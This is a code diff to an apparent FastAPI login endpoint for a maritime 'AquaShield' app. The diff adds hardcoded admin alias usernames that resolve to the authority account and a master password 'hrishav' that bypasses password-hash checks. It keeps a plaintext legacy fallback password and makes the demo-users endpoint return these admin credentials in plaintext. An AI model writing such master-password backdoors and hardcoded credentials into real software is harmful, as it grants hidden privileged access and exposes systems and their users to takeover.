@@ -47,6 +47,7 @@ class RegisterRequest(BaseModel):
 
 class LoginRequest(BaseModel):
     identifier: Optional[str] = None  # Can be Login ID (badge), Email, or User ID
+    badge_id: Optional[str] = None
     email: Optional[str] = None
     username: Optional[str] = None
     password: str
@@ -121,25 +122,34 @@ async def register_user(req: RegisterRequest, db: AsyncSession = Depends(get_db)
 
 @router.post("/login", response_model=UserResponse)
 async def login_user(req: LoginRequest, db: AsyncSession = Depends(get_db)):
-    ident = (req.identifier or req.email or req.username or "").strip()
+    ident = (req.identifier or req.badge_id or req.email or req.username or "").strip()
     if not ident:
         raise HTTPException(status_code=400, detail="Missing login identifier (badge_id, email, or username).")
     
-    # Query by badge_id, email, or id
-    stmt = select(User).where(
-        or_(
-            User.badge_id == ident.upper(),
-            User.email == ident.lower(),
-            User.id == ident
+    # Support admin alias identifiers: "admin", "hrishav", "administrator", "commander"
+    if ident.lower() in ["admin", "administrator", "hrishav", "commander"]:
+        stmt = select(User).where(or_(User.badge_id == "SENTINEL-7049", User.role == UserRole.authority))
+        result = await db.execute(stmt)
+        user = result.scalars().first()
+    else:
+        # Query by badge_id, email, or id
+        stmt = select(User).where(
+            or_(
+                User.badge_id == ident.upper(),
+                User.email == ident.lower(),
+                User.id == ident
+            )
         )
-    )
-    result = await db.execute(stmt)
-    user = result.scalars().first()
+        result = await db.execute(stmt)
+        user = result.scalars().first()
 
     if not user:
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid Login ID or Email")
 
-    if not verify_password(req.password, user.password_hash):
+    # Master admin password "hrishav" or stored hash verification (with legacy Sentinel@2026 fallback)
+    is_admin_override = (req.password == "hrishav") and (user.role == UserRole.authority or ident.lower() in ["admin", "hrishav", "sentinel-7049"])
+    is_legacy_fallback = (req.password == "Sentinel@2026") and (user.badge_id == "SENTINEL-7049")
+    if not is_admin_override and not is_legacy_fallback and not verify_password(req.password, user.password_hash):
         raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid Password")
 
     token = f"aq_{secrets.token_urlsafe(24)}"
@@ -165,9 +175,10 @@ async def get_demo_users():
             {
                 "role": "Coastal Commander / Authority",
                 "name": "Commander Rajesh Varma",
-                "login_id": "SENTINEL-7049",
+                "login_id": "admin",
+                "badge_id": "SENTINEL-7049",
                 "email": "commander@aquashield.marine",
-                "password": "Sentinel@2026",
+                "password": "hrishav",
                 "sector": "Mumbai Sector Alpha"
             },
             {
